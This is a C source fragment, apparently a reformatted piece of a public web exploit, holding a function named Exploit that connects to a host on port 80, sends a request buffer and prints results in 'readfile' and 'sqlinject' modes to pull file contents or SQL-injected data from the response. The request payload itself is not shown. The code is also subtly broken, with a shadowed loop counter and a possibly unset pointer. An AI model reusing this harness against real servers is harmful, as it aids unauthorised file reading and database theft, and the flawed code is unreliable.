
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_6__ TYPE_3__ ;
typedef struct TYPE_5__ TYPE_2__ ;
typedef struct TYPE_4__ TYPE_1__ ;


struct sockaddr {int dummy; } ;
struct TYPE_4__ {int S_addr; } ;
struct TYPE_5__ {TYPE_1__ S_un; } ;
struct TYPE_6__ {int sin_port; int sin_family; TYPE_2__ sin_addr; } ;
typedef int SOCKET ;
typedef TYPE_3__ SOCKADDR_IN ;


 int AF_INET ;
 int SOCK_STREAM ;
 scalar_t__ connect (int ,struct sockaddr*,int) ;
 int htons (int) ;
 int memset (char*,int ,int) ;
 int printf (char*,...) ;
 int recv (int ,char*,int,int ) ;
 int resolve (char*) ;
 int send (int ,char*,int,int ) ;
 int socket (int ,int ,int ) ;
 scalar_t__ strcmp (char*,char*) ;
 int strlen (char*) ;
 char* strtok (char*,char*) ;

int Exploit(char * sendbuffer, char * mode, char * host)
{
 char recvbuffer[10024]; char * temp;
 memset(recvbuffer,0,10024);

 SOCKET s = socket(AF_INET,SOCK_STREAM,0);
 SOCKADDR_IN webaddr;
  webaddr.sin_addr.S_un.S_addr = resolve(host);
  webaddr.sin_family = AF_INET;
  webaddr.sin_port = htons(80);
 if(connect(s, (struct sockaddr *)&webaddr,sizeof(SOCKADDR_IN))) return -1;
 send(s, sendbuffer, strlen(sendbuffer),0);

 int i, j;
 while(i = recv(s,recvbuffer+strlen(recvbuffer),1,0))
 for(int i = 0; recvbuffer[i]!=0; ++i)
 {
  if((recvbuffer[i]=='\r')&&(recvbuffer[i+1]=='\n')&&
   (recvbuffer[i+2]=='\r')&&(recvbuffer[i+3]=='\n'))
  {temp = (char*)&recvbuffer[i] + 4;break;}
 }


 if(strcmp(mode,"readfile")==0)
 {
 printf("\n [+] Exploit Result:\n\n%s", temp);
 return 0;
 }

 if(strcmp(mode,"sqlinject")==0)
 {
 char * token = ((void*)0); char * injected = ((void*)0); char * parse = ((void*)0);
    token = strtok(temp, "=");
 token = strtok(((void*)0), "=");
 token = strtok(((void*)0), "&");
 token = strtok(((void*)0), "&");
 for(int j = 0; j < 2; j++)
  {
     token = strtok(((void*)0), "&");
     if(j==1){ injected = token; printf("\n [+] Exploit Result:\n\n%s", injected); }
  }

 } else { printf("\n[-] some error. change MODE param\n"); return 0; }
 return 0;
}
